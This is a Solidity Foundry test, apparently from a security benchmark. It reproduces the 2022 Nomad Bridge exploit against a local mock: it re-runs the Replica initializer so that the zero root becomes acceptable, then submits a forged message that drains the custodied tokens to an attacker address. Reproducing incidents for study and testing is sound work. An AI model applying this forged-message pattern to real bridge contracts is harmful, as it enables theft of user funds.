// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {NomadReplicaClone} from "../fixtures/upgrade-governance/b-incident/NomadReplicaClone.sol";

/// @title upgrade-governance tier (b): Nomad Bridge exploit (2022-08-01, Ethereum, ~$190M).
/// @notice Minimized offline reproduction of the documented mechanism: a routine
///         implementation upgrade re-ran the Replica initializer, which marked the ZERO root
///         acceptable. Every forged message resolves to the zero root, so process() honors
///         fabricated messages and releases custodied funds. Verdict derived from the real
///         outcome: the bridge is drained by an un-proven message. See PROVENANCE.md.
contract NomadReplicaIncidentTest is Test {
    uint256 constant BRIDGE_FUNDS = 100e8; // representative (WBTC has 8 decimals); scaled
    address constant ATTACKER = address(0xBAD54);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[upgrade-governance] target=", target, " verdict=", verdict));
    }

    function test_nomad_reinitZeroRoot_forgedMessage_drains() public {
        MockERC20 wbtc = new MockERC20();
        NomadReplicaClone replica = new NomadReplicaClone();

        // The bridge custodies deposited funds (released on valid inbound messages).
        wbtc.mint(address(replica), BRIDGE_FUNDS);

        // The routine upgrade re-runs initialize(), which marks the zero root acceptable.
        replica.initialize();
        assertTrue(replica.acceptableRoot(bytes32(0)), "upgrade re-init made the zero root acceptable");

        // ATTACK: submit a forged message. Its (never-run) proof resolves to the zero root,
        // which is now acceptable, so process() releases the bridge's funds to the attacker.
        vm.prank(ATTACKER);
        replica.process(bytes32(0), address(wbtc), ATTACKER, BRIDGE_FUNDS);

        bool drained = (wbtc.balanceOf(address(replica)) == 0 && wbtc.balanceOf(ATTACKER) == BRIDGE_FUNDS);
        _report("nomad-reinit-root-victim", drained);

        assertTrue(drained, "forged message against the zero root should drain the bridge");
        assertEq(wbtc.balanceOf(ATTACKER), BRIDGE_FUNDS, "attacker drained the bridge");
    }
}
